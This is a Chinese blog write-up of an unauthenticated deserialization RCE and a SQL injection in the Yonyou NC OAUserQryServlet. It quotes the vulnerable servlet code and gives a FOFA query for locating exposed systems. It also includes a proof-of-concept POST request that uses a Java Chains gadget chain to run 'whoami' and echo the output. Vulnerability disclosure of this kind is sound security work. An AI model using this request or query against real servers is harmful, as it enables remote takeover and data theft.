---
title: "用友NC OAUserQryServlet 反序列化漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-OAUserQryServlet-rce-sqli.html
asset_dir: assets/用友nc-oauserqryservlet-反序列化漏洞+sql注入漏洞
---

# 用友NC OAUserQryServlet 反序列化漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/21 09:08
- 1117浏览
- [0评论](#comment)
- 27分钟阅读

深入探索

授权

客户关系管理

sql

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`OAUserQryServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`OAUserQryServlet`反序列化该恶意对象时，就会触发[代码执行](https://mrxn.net/tag/rce)。该漏洞可能允许攻击者在服务器上执行任意代码，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞修复方案

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

## 反序列化

直接看下`OAUserQryServlet`的实现

```
public class OAUserQryServlet extends HttpServlet {
    private static final long serialVersionUID = -5847889958965745395L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

深入探索

防火墙软件

服务器安全服务

安全研究工具

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行**（**[RCE](https://mrxn.net/tag/rce)**）漏洞。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

SQL注入防护

## SQL注入

在反序列化下面的**getUserByCode**方法中

```
try {
    headInfo = (HashMap)in.readObject();
} catch (ClassNotFoundException e1) {
    CpLogger.error(e1.getMessage());
}

String dsName = (String)headInfo.get("dsName");
String usercode = (String)headInfo.get("usercode");
ISecurityTokenCallback sc = (ISecurityTokenCallback)NCLocator.getInstance().lookup(ISecurityTokenCallback.class);
InvocationInfoProxy.getInstance().setUserCode(usercode);
byte[] annonyTokens = sc.token("0".getBytes(), usercode.getBytes());
sc.restore(annonyTokens);
UserQryService service = new UserQryServiceImpl();
CpUserWithDetailVO[] userArray = service.getUserByCode(usercode, dsName);
```

参数`dsName`和`usercode`被带入了`getUserByCode`方法，再看下它的实现逻辑

代码安全审计

```
    public CpUserWithDetailVO[] getUserByCode(String param, String dataSourceName) {
        InvocationInfoProxy.getInstance().setUserDataSource(dataSourceName);
        ISecurityTokenCallback sc = (ISecurityTokenCallback)NCLocator.getInstance().lookup(ISecurityTokenCallback.class);
        InvocationInfoProxy.getInstance().setUserCode(param);
        byte[] annonyTokens = sc.token("0".getBytes(), param.getBytes());
        sc.restore(annonyTokens);
        String tableName = CpUserWithDetailUtil.getDefaultTableName();
        PtBaseDAO dao = new PtBaseDAO(dataSourceName);
        String sql = "select * from " + tableName + " where cp_user.user_code = '" + param + "'";
        List list = null;
```

到这就很明显了，参数**param**即**usercode**没有过滤或校验就被直接拼接进SQL语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /servlet/OAUserQryServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行命令执行回显

物流软件安全

[![用友NC OAUserQryServlet 反序列化漏洞+SQL注入漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

成功执行命令并回显执行结果

[![用友NC OAUserQryServlet 反序列化漏洞+SQL注入漏洞](images/img-002-5e644af50b1b.webp)](https://image.mrxn.net/eda40aad71374460b064acdb6dfa41b5.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.反序列化](#toc-4-1-)
- [4.2.SQL注入](#toc-4-2-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
